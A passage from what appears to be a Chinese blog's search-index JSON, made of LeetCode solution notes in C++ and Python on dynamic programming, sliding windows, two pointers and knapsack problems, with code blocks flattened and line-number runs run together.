0; g[1] = f[1] * 1; for(int i = 0; i &lt; LEN; i++) { g[i + 2] = max(g[i + 1], g[i] + f[i + 2] * (i + 2)); } return *max_element(g.begin(), g.end()); }public: int deleteAndEarn(vector&lt;int&gt;&amp; nums) { vector&lt;int&gt; f(LEN + 2); for(int i = 0; i &lt; nums.size(); i++) { f[nums[i]]++; } return rob(f); }}; 统计放置房子的方式数source: 2320.统计放置房子的方式数 1234567891011121314151617181920212223242526272829303132333435363738394041424344// versionclass Solution {private: const static int magic = 1e9 + 7;public: int countHousePlacements(int n) { vector&lt;long long &gt; f(n + 2); f[0] = 1; f[1] = 2; for(int i = 0; i &lt; n; i++) { f[i + 2] = (f[i + 1] + f[i]) %magic; } return (f[n] * f[n]) % magic; }};// version 2class Solution {private: const static int magic = 1e9 + 7; vector&lt;long long&gt; memo; int dfs(int i){ if(i &lt; 0) return 0; long long &amp;num = memo[i]; if(num != 0) { return num; } num = (dfs(i - 1) + dfs(i - 2)) % magic; return num; }public: int countHousePlacements(int n) { memo.resize(n + 1, 0); memo[0] = 1; memo[1] = 2; long long res = dfs(n); return ( res * res ) % magic; }}; 打家劫舍 IIsource: 213. 打家劫舍 II 123456789101112131415161718class Solution {private: int rob(vector&lt;int&gt; &amp; nums, int start, int end){ int n = nums.size(); vector&lt;int&gt; f(n + 2); for(int i = start; i &lt; end; i++) { f[i + 2] = max(f[i] + nums[i], f[i + 1]); } return f[end + 1]; }public: int rob(vector&lt;int&gt;&amp; nums) { int n = nums.size(); return max(nums[0] + rob(nums, 2, n - 1), rob(nums, 1, n)); }}; 施咒的最大总伤害source:3186. 施咒的最大总伤害 12345678910111213141516171819202122232425262728class Solution {private: vector&lt;long long&gt; memo; long long dfs(int i, vector&lt;int&gt;&amp; pcount){ if(i &lt; 0) return 0; long long &amp;value = memo[i]; if(value != -1) return value; value = max(dfs(i - 3, pcount) + pcount[i] * i, dfs(i - 1, pcount)); return value; }public: long long maximumTotalDamage(vector&lt;int&gt;&amp; power) { int n = power.size(); int mx = *max_element(power.begin(), power.end()); vector&lt;int&gt; pcount(mx + 1); memo.resize(mx + 1, -1); for(int i = 0; i &lt; power.size(); i++) { pcount[power[i]]++; } return dfs(mx, pcount); }}; 最大子数组和source: 53. 最大子数组和 12345678910111213141516class Solution {public: int maxSubArray(vector&lt;int&gt;&amp; nums) { int n = nums.size(); vector&lt;int&gt; f(n); f[0] = nums[0]; for(int i = 1; i &lt; n; i++) { f[i] = max(f[i - 1], 0) + nums[i]; } return *max_element(f.begin(), f.end()); }}; 找到最大开销的子字符串source: 2606. 找到最大开销的子字符串 123456789101112131415161718class Solution {public: int maximumCostSubstring(string s, string chars, vector&lt;int&gt;&amp; vals) { int n = s.size(); vector&lt;int&gt; f(n + 1); for(int i = 0; i &lt; n; i++) { char chr = s[i]; int pos = chars.find(chr); int val = pos == -1? chr - 'a' + 1: vals[pos]; f[i + 1] = max(f[i], 0) + val; } int mx = *max_element(f.begin(), f.end()); return mx &lt; 0? 0 : mx; }}; 任意子数组和的绝对值的最大值source: 1749. 任意子数组和的绝对值的最大值 12345678910111213141516171819class Solution {public: int maxAbsoluteSum(vector&lt;int&gt;&amp; nums) { int n = nums.size(); vector&lt;int&gt; f(n + 1); vector&lt;int&gt; g(n + 1); for(int i = 0; i &lt; n; i++) { f[i + 1] = max(f[i], 0) + nums[i]; g[i + 1] = min(g[i], 0) + nums[i]; } int mx = *max_element(f.begin(), f.end()); int mn = *min_element(g.begin(), g.end()); return max(abs(mx), abs(mn)); }}; K 次串联后最大子数组之和source: 1191. K 次串联后最大子数组之和 123456789101112131415161718192021222324252627282930class Solution {private: const static int base = 1e9 + 7;public: int kConcatenationMaxSum(vector&lt;int&gt;&amp; arr, int k) { int n = arr.size(); vector&lt;long long&gt; f(n * 2 + 1); long long mx1 = 0; long long sum = 0; for (int i = 0; i &lt; n; i++) { sum += arr[i]; f[i + 1] = max(f[i], (long long)0) + arr[i]; if (f[i + 1] &gt; mx1) mx1 = f[i + 1]; } long long mx2 = 0; for (int i = n; i &lt; n * 2; i++) { f[i + 1] = max(f[i], (long long)0) + arr[i - n]; if (f[i + 1] &gt; mx2) mx2 = f[i + 1]; } if (k == 1) return int(mx1 % base) &gt; 0 ? int(mx1 % base) : 0; if (k == 2) return int(mx2 % base); return sum &gt; 0 ? (mx2 + ((k - 2) * sum) % base) % base : mx2; }}; 环形子数组的最大和source: 918. 环形子数组的最大和 123456789101112131415161718192021class Solution {public: int maxSubarraySumCircular(vector&lt;int&gt;&amp; nums) { int n = nums.size(); vector&lt;int&gt; f(n + 1, INT_MIN); vector&lt;int&gt; g(n + 1, INT_MAX); int sum = 0; for(int i = 0; i &lt; n; i++) { sum += nums[i]; f[i + 1] = max(f[i], 0) + nums[i]; g[i + 1] = min(g[i], 0) + nums[i]; } int mx = *max_element(f.begin(), f.end()); int mn = *min_element(g.begin(), g.end()); if(sum == mn) return mx; return max(mx, sum - mn); }}; 拼接数组的最大分数source : 2321. 拼接数组的最大分数 123456789101112131415161718192021222324252627class Solution {private: int maxSum(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) { int n = nums1.size(); vector&lt;int&gt; sub(n); vector&lt;int&gt; f(n + 1); int sum = 0; for (int i = 0; i &lt; n; i++) { sub[i] = nums2[i] - nums1[i]; sum += nums1[i]; } for (int i = 0; i &lt; n; i++) { f[i + 1] = max(f[i], 0) + sub[i]; } return *max_element(f.begin(), f.end()) + sum; }public: int maximumsSplicedArray(vector&lt;int&gt;&amp; nums1, vector&lt;int&gt;&amp; nums2) { return max(maxSum(nums1, nums2), maxSum(nums2, nums1)); }};","link":"/posts/c8c56b75.html"},{"title":"滑动窗口","text":"题目来源:灵茶山艾府-题单 定长滑动窗口定长子串中元音的最大数目1456.定长子串中元音的最大数目 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172// 版本一const static set&lt;char&gt; vowels{'a', 'e', 'i', 'o','u'};class Solution {public: bool isVowel(char c) { if (vowels.find(c) != vowels.end()) { return true; } return false; } int maxVowels(string s, int k) { size_t len = s.length(); if (k &gt; len) { return 0; } int res = 0; int count = len - k; for (int i = 0; i &lt; k; i++) { if (isVowel(s[i])) { res++; } } if (res == k) { return res; } int tmp = res; for (int i = 0, end = k - 1; i &lt;= count;) { if (isVowel(s[i])) { tmp = tmp - 1; } i++; end++; if (isVowel(s[end])) { tmp = tmp + 1; } res = max(res, tmp); } return res; }};// 版本二const static set&lt;char&gt; vowels{'a', 'e', 'i', 'o', 'u'};class Solution {public: bool isVowel(char c) { return vowels.find(c) != vowels.end(); } int maxVowels(string s, int k) { size_t len = s.length(); int ans = 0, vowel = 0; for (int i = 0; i &lt; len; i++) { if (isVowel(s[i])) { vowel++; } if (i &lt; k - 1) { continue; } ans = max(ans, vowel); char out = s[i - k + 1]; if (isVowel(out)) { vowel--; } } return ans; }}; 子数组最大平均数 I643. 子数组最大平均数 I 123456789101112131415class Solution {public: double findMaxAverage(vector&lt;int&gt;&amp; nums, int k) { size_t len = nums.size(); int ans = INT_MIN, s = 0; for (int i = 0; i &lt; len; i++) { s += nums[i]; if (i &lt; k - 1) continue; ans = max(ans, s); s -= nums[i - k + 1]; } return static_cast&lt;double&gt;(ans) / k; }}; 半径为 k 的子数组平均值2090. 半径为 k 的子数组平均值 12345678910111213141516171819class Solution {public: vector&lt;int&gt; getAverages(vector&lt;int&gt;&amp; nums, int k) { size_t len = nums.size(); vector&lt;int&gt; ans(len, -1); long long s = 0; for (int i = 0; i &lt; len; i++) { s += nums[i]; if (i &lt; k &lt;&lt; 1) { continue; } ans[i - k] = s / (k * 2 + 1); s -= nums[i - k * 2]; } return ans; }}; 几乎唯一子数组的最大和2841. 几乎唯一子数组的最大和 12345678910111213141516171819202122232425class Solution {public: long long maxSum(vector&lt;int&gt;&amp; nums, int m, int k) { long long ans = 0, s = 0; size_t n = nums.size(); map&lt;int, int&gt; count; for (int i = 0; i &lt; n; i++) { s += nums[i]; count[nums[i]]++; if (i &lt; k - 1) continue; if (count.size() &gt;= m) { ans = max(ans, s); } s -= nums[i - k + 1]; if (--count[nums[i - k + 1]] == 0) { count.erase(nums[i - k + 1]); } } return ans; }}; 可获得的最大点数1423. 可获得的最大点数 12345678910111213141516171819202122class Solution {public: int maxScore(vector&lt;int&gt;&amp; cardPoints, int k) { size_t n = cardPoints.size(); int ans = INT_MAX, sum = 0, total = 0; size_t m = n - k; for (size_t i = 0; i &lt; n; i++) { sum += cardPoints[i]; total += cardPoints[i]; if (i &lt; m - 1) continue; ans = min(ans, sum); sum -= cardPoints[i - m + 1]; } return total - ans &lt; 0 ? total : total - ans; }}; 爱生气的书店老板1052. 爱生气的书店老板 123456789101112131415161718class Solution {public: int maxSatisfied(vector&lt;int&gt;&amp; customers, vector&lt;int&gt;&amp; grumpy, int minutes) { int s[2]{}, sum = 0; int n = customers.size(); for (int i = 0; i &lt; n; i++) { s[grumpy[i]] += customers[i]; if (i &lt; minutes - 1) continue; sum = max(sum, s[1]); s[1] -= grumpy[i - minutes + 1] == 1 ? customers[i - minutes + 1] : 0; } return s[0] + sum; }}; 拆炸弹1652. 拆炸弹 12345678910111213141516171819class Solution {public: vector&lt;int&gt; decrypt(vector&lt;int&gt;&amp; code, int k) { int n = code.size(); vector&lt;int&gt; ans(n); int r = k &gt; 0 ? k + 1 : n; k = abs(k); int s = reduce(code.begin() + r - k, code.begin() + r); for (int i = 0; i &lt; n; i++) { ans[i] = s; s += code[r % n] - code[(r - k) % n]; r++; } return ans; }}; 不定长滑动窗口无重复字符的最长子串3. 无重复字符的最长子串 123456789101112131415161718class Solution {public: int lengthOfLongestSubstring(string s) { int n = s.length(), ans = 0, left = 0; unordered_set&lt;char&gt; window; for (int right = 0; right &lt; n; right++) { char c = s[right]; while (window.contains(c)) { window.erase(s[left]); left++; } window.insert(c); ans = max(ans, right - left + 1); } return ans; }}; 删掉一个元素以后全为 1 的最长子数组1493. 删掉一个元素以后全为 1 的最长子数组] 123456789101112131415161718class Solution {public: int longestSubarray(vector&lt;int&gt;&amp; nums) { int n = nums.size(), ans = 0, left = 0, cnt = 0; for (int right = 0; right &lt; n; right++) { if (nums[right] == 0) cnt++; while (cnt &gt; 1) { if (nums[left] == 0) cnt--; left++; } ans = max(ans, right - left); } return ans; }}; 最多 K 个重复元素的最长子数组2958. 最多 K 个重复元素的最长子数组 123456789101112131415161718192021class Solution {public: int maxSubarrayLength(vector&lt;int&gt;&amp; nums, int k) { int n = nums.size(), left = 0, ans = 0; unordered_map&lt;int, int&gt; window; for (int i = 0; i &lt; n; i++) { int current = nums[i]; window[current]++; while (window[current] &gt; k) { window[nums[left]]--; left++; } ans = max(ans, i - left + 1); } return ans; }}; 考试的最大困扰度2024. 考试的最大困扰度 12345678910111213141516class Solution {public: int maxConsecutiveAnswers(string answerKey, int k) { int n = answerKey.length(), left = 0, ans = 0; int cnt[2]{}; for (int right = 0; right &lt; n; right++) { cnt[answerKey[right] &gt;&gt; 1 &amp; 1]++; while(cnt[0] &gt; k &amp;&amp; cnt[1] &gt; k) { cnt[answerKey[left++] &gt;&gt; 1 &amp; 1]--; } ans = max(ans, right - left + 1); } return ans; }}; 将 x 减到 0 的最小操作数1658. 将 x 减到 0 的最小操作数 1234567891011121314151617181920212223class Solution {public: int minOperations(vector&lt;int&gt;&amp; nums, int x) { int target = reduce(nums.begin(), nums.end()) - x; if (target &lt; 0) return -1; int ans = -1, left = 0, sum = 0, n = nums.size(); for (int right = 0; right &lt; n; right++) { sum += nums[right]; while (sum &gt; target) { sum -= nums[left]; left++; } if (sum == target) { ans = max(ans, right - left + 1); } } return ans &lt; 0 ? -1 : n - ans; }}; 长度最小的子数组209. 长度最小的子数组 1234567891011121314151617class Solution {public: int minSubArrayLen(int target, vector&lt;int&gt;&amp; nums) { int n = nums.size(); int left = 0, ans = n + 1, sum = 0; for (int right = 0; right &lt; n; right++) { sum += nums[right]; while (sum &gt;= target) { ans = min(ans, right - left + 1); sum -= nums[left++]; } } return ans &lt;= n ? ans : 0; }}; 最短且字典序最小的美丽子字符串2904. 最短且字典序最小的美丽子字符串 123456789101112131415161718192021222324class Solution {public: string shortestBeautifulSubstring(string s, int k) { if (ranges::count(s, '1') &lt; k) { return &quot;&quot;; } string ans = s; int cnt1 = 0, left = 0; for(int right = 0; right &lt; s.length(); right++) { cnt1 += s[right] - '0'; while (cnt1 &gt; k || s[left] == '0') { cnt1 -= s[left++] -'0'; } if (cnt1 == k) { string t = s.substr(left, right - left + 1); if (t.length() &lt; ans.length() || t.length() == ans.length() &amp;&amp; t &lt; ans) { ans = move(t); } } } return ans; }}; 替换子串得到平衡字符串1234. 替换子串得到平衡字符串 12345678910111213141516171819202122232425class Solution {public: int balancedString(string s) { int len = s.length(); unordered_map&lt;char, int&gt; cnt; int left = 0, ans = len, m = len / 4; for (char c : s) cnt[c]++; if (cnt['Q'] == m &amp;&amp; cnt['W'] == m &amp;&amp; cnt['E'] == m &amp;&amp; cnt['R'] == m) return 0; for (int right = 0; right &lt; len; right++) { cnt[s[right]]--; while (cnt['Q'] &lt;= m &amp;&amp; cnt['W'] &lt;= m &amp;&amp; cnt['E'] &lt;= m &amp;&amp; cnt['R'] &lt;= m) { ans = min(ans, right - left + 1); cnt[s[left++]]++; } } return ans; }}; 无限数组的最短子数组2875. 无限数组的最短子数组 12345678910111213141516171819202122232425class Solution {public: int minSizeSubarray(vector&lt;int&gt;&amp; nums, int target) { int size = nums.size(); long long total = accumulate(nums.begin(), nums.end(), 0LL); int tms = target % total, tds = target / total; int s = 0; int left = 0, ans = 2 * size; for (int right = 0; right &lt; 2 * size; right++) { s += nums[right % size]; while (s &gt; tms) { s -= nums[left % size]; left++; } if (s == tms) { ans = min(ans, right - left + 1); } } return ans == 2 * size ? -1 : ans + tds * size; }}; 包含所有三种字符的子字符串数目1358. 包含所有三种字符的子字符串数目 123456789101112131415161718class Solution {public: int numberOfSubstrings(string s) { unordered_map&lt;char, int&gt; cnt; int ans = 0, left = 0; for (char c : s) { cnt[c]++; while(cnt['a'] &amp;&amp; cnt['b'] &amp;&amp; cnt['c']) { cnt[s[left]]--; left++; } ans += left; } return ans; }}; 统计好子数组的数目2537. 统计好子数组的数目 123456789101112131415161718class Solution {public: long long countGood(vector&lt;int&gt;&amp; nums, int k) { unordered_map&lt;int, int&gt; cnt; long long ans = 0; int left = 0, pair = 0; for (int num : nums) { pair += cnt[num]++; while (pair &gt;= k) { pair -= --cnt[nums[left]]; left++; } ans += left; } return ans; }}; 乘积小于 K 的子数组713. 乘积小于 K 的子数组 123456789101112131415161718192021class Solution {public: int numSubarrayProductLessThanK(vector&lt;int&gt;&amp; nums, int k) { if (k &lt;= 1) { return 0; } long long prod = 1; int left = 0, right = 0, ans = 0; for (int num : nums) { prod *= num; while (prod &gt;= k) { prod /= nums[left++]; } ans += right - left + 1; right++; } return ans; }}; 不间断子数组2762. 不间断子数组 123456789101112131415161718192021class Solution {public: long long continuousSubarrays(vector&lt;int&gt;&amp; nums) { map&lt;int, int&gt; umap; long long ans = 0; int left = 0, right = 0; for (int num : nums) { umap[num]++; while (umap.rbegin()-&gt;first - umap.begin()-&gt;first &gt; 2) { if (--umap[nums[left]] == 0){ umap.erase(nums[left]); } left++; } ans += right - left + 1; right++; } return ans; }}; 和相同的二元子数组930. 和相同的二元子数组 12345678910111213141516171819202122class Solution {public: int numSubarraysWithSum(vector&lt;int&gt;&amp; nums, int goal) { return f(nums, goal) - f(nums, goal + 1); } int f(const vector&lt;int&gt;&amp; nums, int goal) { int left = 0, right = 0, n = nums.size(); long ans = 0, sum = 0; while (right &lt; n) { sum += nums[right]; while (sum &gt;= goal &amp;&amp; left &lt;= right) { sum -= nums[left++]; } ans += left; right++; } return ans; }};","link":"/posts/705bf0de.html"},{"title":"双指针","text":"题目来源:灵茶山艾府-题单 双向双指针有序数组的平方977. 有序数组的平方 12345678910111213141516171819class Solution {public: vector&lt;int&gt; sortedSquares(vector&lt;int&gt;&amp; nums) { int n = nums.size(); vector&lt;int&gt; ans(n); int i = 0, j = n - 1; for (int p = n - 1; p &gt;= 0; p--) { if(-nums[i] &gt; nums[j]) { ans[p] = pow(nums[i], 2); i++; }else { ans[p] = pow(nums[j], 2); j--; } } return ans; }}; 数组中的 k 个最强值1471. 数组中的 k 个最强值 12345678910111213141516171819202122232425262728293031class Solution {public: vector&lt;int&gt; getStrongest(vector&lt;int&gt;&amp; arr, int k) { sort(arr.begin(), arr.end()); int n = arr.size(); int m = arr[(n - 1) / 2], i = 0, j = n - 1; vector&lt;int&gt; ans; while (k &gt; 0) { if (f(arr[i], arr[j], m)) { ans.push_back(arr[i]); i++; } else { ans.push_back(arr[j]); ; j--; } k--; } return ans; } bool f(int a, int b, int m) { if (abs(a - m) &gt; abs(b - m) || (abs(a - m) == abs(b - m) &amp;&amp; a &gt; b)) { return true; } return false; }}; 三数之和15. 三数之和 123456789101112131415161718192021222324252627class Solution {public: vector&lt;vector&lt;int&gt;&gt; threeSum(vector&lt;int&gt;&amp; nums) { auto n = nums.size(); sort(nums.begin(), nums.end()); vector&lt;vector&lt;int&gt;&gt; ans; for (int i = 0; i &lt; n - 2; i++) { if(i &amp;&amp; nums[i] == nums[i - 1]) continue; int left = i + 1, right = n - 1; while (left &lt; right) { int sum = nums[i] + nums[left] + nums[right]; if (sum &lt; 0) { left++; } else if (sum &gt; 0) { right--; } else { ans.push_back({nums[i], nums[left], nums[right]}); for (left++; left &lt; right &amp;&amp; nums[left] == nums[left - 1]; left++); for (right--; right &gt; left &amp;&amp; nums[right] == nums[right + 1]; right--); } } } return ans; }}; 最接近的三数之和16. 最接近的三数之和 123456789101112131415161718192021222324252627282930class Solution {public: int threeSumClosest(vector&lt;int&gt;&amp; nums, int target) { long long ans = INT_MAX, n = nums.size(); sort(nums.begin(), nums.end()); for (int i = 0; i &lt;= n - 3; i++) { int j = i + 1, k = n - 1; while (j &lt; k) { long long sum = nums[i] + nums[j] + nums[k]; if (sum &gt; target) { if (abs(sum - target) &lt; abs(ans - target)) { ans = sum; } k--; } else if (sum &lt; target) { if (abs(sum - target) &lt; abs(ans - target)) { ans = sum; } j++; } else { return target; } } } return ans; }};","link":"/posts/91a7e4d1.html"},{"title":"背包","text":"题单来源: 灵茶山艾府 01 背包目标和source: 494. 目标和 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051class Solution: def findTargetSumWays(self, nums: List[int], target: int) -&gt; int: target += sum(nums) if target &lt; 0 or target % 2: return 0 target //= 2 n = len(nums) ## f = [[-1] * (target + 1) for _ in range(n)] ## def dfs(i, target): ## if i &lt; 0: ## return 1 if target == 0 else 0 ## if f[i][target] != -1: ## return f[i][target] ## if target &lt; nums[i]: ## f[i][target] = dfs(i-1, target) ## else: ## f[i][target] = dfs(i-1, target - nums[i]) + dfs(i-1, target) ## return f[i][target] ## return dfs(n-1, target) ## def dfs(): ## f = [[0] * (target + 1) for _ in range(2)] ## f[0][0] = 1 ## for i, x in enumerate(nums): ## for c in range(target + 1): ## if c &lt; x: ## f[(i + 1) %2][c] = f[i % 2][c] ## else: ## f[(i + 1) %2][c] = f[i % 2][c] + f[i % 2][c - x] ## return f[n % 2][target] def dfs(): f = [0] * (target + 1) f[0] = 1 for x in nums: for c in range(target, x - 1, -1): f[c] = f[c] + f[c - x] return f[target] return dfs() 和为目标值的最长子序列的长度source: 2915. 和为目标值的最长子序列的长度 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364class Solution: def lengthOfLongestSubsequence(self, nums: List[int], target: int) -&gt; int: @cache def dfs(i, t): if i &lt; 0: return 0 if t == 0 else -inf if t &lt; nums[i]: return dfs(i - 1, t) else: return max(1 + dfs(i - 1, t - nums[i]), dfs(i - 1, t)) ## n = len(nums) ## ans = dfs(n - 1, target) ## dfs.cache_clear() ## return ans if ans &gt; 0 else -1 def dfs() -&gt;int: n = len(nums) f = [[-inf] * (target + 1) for _ in range(n + 1)] f[0][0] = 0 for i, x in enumerate(nums): for c in range(target + 1): if c &lt; x : f[i + 1][c] = f[i][c] else: f[i + 1][c] = max(1 + f[i][c - x], f[i][c]) return f[n][target] ## ans = dfs() ## return ans if ans &gt; 0 else -1 def dfs() -&gt;int: n = len(nums) f = [[-inf] * (target + 1) for _ in range(2)] f[0][0] = 0 for i, x in enumerate(nums): for c in range(target + 1): if c &lt; x : f[(i + 1) % 2][c] = f[i % 2][c] else: f[(i + 1) % 2][c] = max(1 + f[i % 2][c - x], f[i % 2][c]) return f[n % 2][target] ## ans = dfs() ## return ans if ans &gt; 0 else -1 def dfs() -&gt;int: n = len(nums) f = [-inf] * (target + 1) f[0] = 0 for x in nums: for c in range(target, x - 1, -1): f[c] = max(1 + f[c - x], f[c]) return f[target] ans = dfs() return ans if ans &gt; 0 else -1 分割等和子集source: 416. 分割等和子集 1234567891011121314class Solution: def canPartition(self, nums: List[int]) -&gt; bool: s = sum(nums) if s % 2 : return False s //= 2 f = [False] * (s + 1) f[0] = True for x in nums: for c in range(s, x - 1, -1): f[c] = f[c] or f[c - x] return f[s] 将一个数字表示成幂的和的方案数source: 2787. 将一个数字表示成幂的和的方案数 12345678910111213141516171819202122232425262728293031323334353637class Solution: def numberOfWays(self, n: int, x: int) -&gt; int: mod = 1e9 + 7 @cache def dfs(i: int, n: int) -&gt; int: if i &lt;= 0: return 1 if n == 0 else 0 if pow(i, x) &gt; n: return dfs(i-1, n) % mod else: return dfs(i - 1, n - pow(i, x))% mod + dfs(i - 1, n) % mod ## return int(dfs(n, n)) def dfs(): nums = list(x for x in range(1, n + 1)) f = [[0] * (n + 1) for _ in range(n + 1)] f[0][0] = 1 for i, num in enumerate(nums): for c in range(n + 1): if num ** x &gt; c : f[i + 1][c] = f[i][c] else: f[i + 1][c] = f[i][c] % mod + f[i][c - num ** x] % mod return int (f[n][n] % mod) def dfs(): f = [0] * (n + 1) f[0] = 1 for i in range(1, n + 1): for c in range(n, pow(i, x) - 1, -1): f[c] = f[c] % mod + f[c - pow(i, x)] % mod return int(f[n] % mod) return dfs() 执行操作可获得的最大总奖励 I题目来源： 3180. 执行操作可获得的最大总奖励 I 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798class Solution: def maxTotalReward(self, rewardValues: List[int]) -&gt; int: rewardValues.sort() @cache def dfs(i, c): if i &lt; 0: return True if c == 0 else False if rewardValues[i] &lt;= c &lt; 2 * rewardValues[i]: return dfs(i - 1, c) or dfs(i - 1, c - rewardValues[i]) else: return dfs(i - 1, c) n = len(rewardValues) mx = rewardValues[n - 1] for c in range(2 * mx - 1, -1, -1): if dfs(n-1, c): return c def dfs(): n = len(rewardValues) c = sum(rewardValues) f = [[False] * (c + 1) for _ in range(n + 1)] f[0][0] = True for i, value in enumerate(rewardValues): for j in range(c + 1): if 2 * value &gt; j &gt;= value: f[i + 1][j] = f[i][j] or f[i][j - value] else: f[i + 1][j] = f[i][j] for i in range(c, 0, -1): print(f[n][i]) if f[n][i] == True: return i ## return dfs() def dfs(): n = len(rewardValues) mx = rewardValues[n - 1] f = [[False] * (2 * mx) for _ in range(n + 1)] f[0][0] = True for i, value in enumerate(rewardValues): for j in range(2 * mx): if 2 * value &gt; j &gt;= value: f[i + 1][j] = f[i][j] or f[i][j - value] else: f[i + 1][j] = f[i][j] for i in range(2 * mx - 1, 0, -1): if f[n][i] == True: return i ## return dfs() def dfs(): n = len(rewardValues) mx = rewardValues[n - 1] f = [[False] * (2 * mx) for _ in range(2)] f[0][0] = True for i, value in enumerate(rewardValues): for j in range(2 * mx): if 2 * value &gt; j &gt;= value: f[(i + 1) % 2][j] = f[i % 2][j] or f[i % 2][j - value] else: f[(i + 1) % 2][j] = f[i % 2][j] for i in range(2 * mx - 1, 0, -1): if f[n % 2][i] == True: return i ## return dfs() def dfs(): n = len(rewardValues) mx = rewardValues[n - 1] f = [False] * (2 * mx) f[0] = True for value in rewardValues: for j in range(2 * value - 1, value - 1, -1): f[j] = f[j] or f[j - value] for i in range(2 * mx - 1, 0, -1): if f[i] == True: return i ## return dfs() 一和零题目来源： 474. 一和零 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657class Solution: def findMaxForm(self, strs: List[str], m: int, n: int) -&gt; int: @cache def dfs(i, c1, c2): if i &lt; 0: return 0 cnt1 = 0 cnt2 = 0 for c in strs[i]: if c == '0': cnt1 += 1 else : cnt2 += 1 if cnt1 &lt;= c1 and cnt2 &lt;= c2: return max(dfs(i - 1, c1, c2), dfs(i - 1, c1 - cnt1, c2 - cnt2) + 1) else: return dfs(i - 1, c1, c2) ## size = len(strs) ## return dfs(size - 1, m, n) def dfs(): size = len(strs) f = [[[0] * (n + 1) for _ in range(m + 1)] for _ in range(size + 1)] for i, s in enumerate(strs): cnt1 = s.count('0') cnt2 = s.count('1') for c1 in range(0, m + 1): for c2 in range(0, n + 1): if cnt1 &lt;= c1 and cnt2 &lt;= c2: f[i + 1][c1][c2] = max(f[i][c1][c2], f[i][c1 - cnt1][c2 - cnt2] + 1) else: f[i + 1][c1][c2] = f[i][c1][c2] return f[size][m][n] ## return dfs() def dfs(): size = len(strs) f = [[0] * (n + 1) for _ in range(m + 1)] for s in strs: cnt1 = s.count('0') cnt2 = s.count('1') for c1 in range(m, cnt1 - 1, -1): for c2 in range(n, cnt2 - 1, -1): f[c1][c2] = max(f[c1][c2], f[c1 - cnt1][c2 - cnt2] + 1)ss return f[m][n] return dfs() 最后一块石头的重量 IIsource: 1049. 最后一块石头的重量 II 12345678910111213141516171819202122232425262728293031323334class Solution: def lastStoneWeightII(self, stones: List[int]) -&gt; int: total = sum(stones) n, m = len(stones), total // 2 @cache def dfs(i, c): if i &lt; 0 : return True if c == 0 else False if stones[i] &gt; c: return dfs(i - 1, c) else: return dfs(i - 1, c) or dfs(i - 1, c - stones[i]) for i in range(m, -1,-1): ans = dfs(n - 1, i) if ans : return total - 2 * i def dfs(): f = [False] * (m + 1) f[0] = True for stone in stones: for weight in range(m, stone - 1, -1): f[weight] = f[weight] or f[weight - stone] for i in range(m, -1, -1): if f[i] : return total - 2 * i return dfs() 最接近目标价格的甜点成本source: 1774.4. 最接近目标价格的甜点成本 1234567891011121314151617181920212223242526class Solution: def closestCost(self, baseCosts: List[int], toppingCosts: List[int], target: int) -&gt; int: max_cost = target + max(baseCosts) + 2 * sum(toppingCosts) dp = [False] * (max_cost + 1) for base in baseCosts: dp[base] = True for topping in toppingCosts: for cost in range(max_cost, -1, -1): if dp[cost]: if cost + topping &lt;= max_cost: dp[cost + topping] = True if cost + 2 * topping &lt;= max_cost: dp[cost + 2 * topping] = True closest = float('inf') for cost in range(max_cost + 1): if dp[cost]: if (abs(cost - target) &lt; abs(closest - target)): closest = cost return closest 盈利计划source: 879. 盈利计划 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374class Solution: def profitableSchemes(self, n: int, minProfit: int, group: List[int], profit: List[int]) -&gt; int: m = len(profit) mod = 10 ** 9 + 7 @cache def dfs(i, nn, p): if i &lt; 0: return 1 if p &gt;= minProfit else 0 if group[i] &lt;= nn: return ((dfs(i - 1, nn - group[i], p + profit[i])) % mod + dfs(i - 1, nn, p) % mod) % mod else: return dfs(i - 1, nn, p) % mod ## return (int)(dfs(m - 1, n, 0) % mod) @cache def dfs(i, nn, c): if i &lt; 0: return 1 if c &lt;= 0 else 0 if group[i] &lt;= nn: return (dfs(i - 1, nn - group[i], c - profit[i]) % mod + dfs(i - 1, nn, c) % mod) % mod else: return dfs(i - 1, nn, c) % mod ## return (int)(dfs(m - 1, n, minProfit) % mod ) def dfs(): f = [[[0] * (minProfit + 1) for _ in range(n + 1)] for _ in range(m + 1)] for i in range(n + 1): f[0][i][0] = 1 for i, pro in enumerate(profit): for nn in range(n + 1): for c in range(minProfit + 1): if group[i] &lt;= nn: f[i + 1][nn][c] = f[i][nn - group[i]][max(0, c - pro)] % mod + f[i][nn][c] % mod else: f[i + 1][nn][c] = f[i][nn][c] return f[m][n][minProfit] % mod ## return dfs() def dfs(): f = [[[0] * (minProfit + 1) for _ in range(n + 1)] for _ in range(2)] for i in range(n + 1): f[0][i][0] = 1 for i, pro in enumerate(profit): for nn in range(n + 1): for c in range(minProfit + 1): if group[i] &lt;= nn: f[(i + 1) % 2][nn][c] = f[i % 2][nn - group[i]][max(0, c - pro)] % mod + f[i % 2][nn][c] % mod else: f[(i + 1) % 2][nn][c] = f[i % 2][nn][c] return f[m % 2][n][minProfit] % mod ## return dfs() def dfs(): f = [[0] * (minProfit + 1) for _ in range(n + 1)] for i in range(n + 1): f[i][0] = 1 for pro, members in zip(profit, group): for nn in range(n, members - 1, -1): for c in range(minProfit + 1): f[nn][c] = f[nn - members][max(0, c - pro)] % mod + f[nn][c] % mod return f[n][minProfit] % mod return dfs() 求出所有子序列的能量和source: 3082. 求出所有子序列的能量和 12345678910111213141516171819202122232425262728293031323334353637383940414243444546class Solution:def sumOfPower(self, nums: List[int], k: int) -&gt; int: n = len(nums) MOD = 10 ** 9 + 7 @cache def dfs(i, j, c): ## 从前i个物品中选择，每个物品的容量为num[i], 总容量为j, 选择的个数为c if i &lt; 0: return 1 if j == 0 and c == 0 else 0 if nums[i] &gt; j: return dfs(i - 1, j, c) % MOD else: return dfs(i - 1, j - nums[i], c - 1) % MOD + dfs(i - 1, j, c) % MOD ## ans = 0 ## pow2 = 1 ## for i in range(n, 0, -1): ## ans += dfs(n - 1, k, i) * pow2 ## pow2 = pow2 * 2 ## return ans % MOD def dfs(): f = [[0] * (n + 1) for _ in range(k + 1)] f[0][0] = 1 for num in nums: for j in 